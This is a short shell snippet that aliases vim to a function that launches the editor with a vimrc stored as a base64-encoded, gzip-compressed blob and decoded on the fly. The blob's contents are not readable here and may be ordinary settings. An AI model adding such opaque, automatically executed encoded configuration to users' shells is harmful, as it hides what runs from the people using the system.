function lvim() {
    \vim -u <(printf '%s' 'H4sICIjg0WkAA3ZpbXJjACtOLVHIy0/Ozy1ILMlMyknlKgYJlOYmpRaBmUWlOVBWTmJxSXFJYklpsa0RWADCycnMS7WNTknNzdfNyU9OzClKjo1RUE3j4soBKlHxCQ72iHdx9fWPD/P0DXJWsFVQT81LBNqTos4FAEU9DNh7AAAA' | base64 -d | gzip -dc) "$@"
}
alias vim=lvim
